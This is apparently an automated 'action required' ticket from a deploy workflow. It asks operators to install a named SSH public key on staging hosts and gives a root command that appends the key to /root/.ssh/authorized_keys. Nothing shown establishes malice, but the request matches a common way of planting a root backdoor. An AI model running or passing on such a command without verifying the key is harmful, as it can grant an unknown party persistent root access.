# [Action Required] Install deploy public key on staging hosts

Automation detected SSH/connectivity issues when running the deploy workflow (run 22794062480). Please install the repository public key on each staging host to allow Ansible runs to proceed.

Public key (from repository):
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCrt0d57G3E81JmCBo3h9PztWDedLto8TSe8WjhgnKZ deploy-runner-automation@2026-03-07

Install example (run on each host as root or with sudo):

mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCrt0d57G3E81JmCBo3h9PztWDedLto8TSe8WjhgnKZ deploy-runner-automation@2026-03-07' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys

Once installed, re-run the deploy workflow or reply here when complete.

Logs: /tmp/deploy-alertmanager-run-22794062480.log
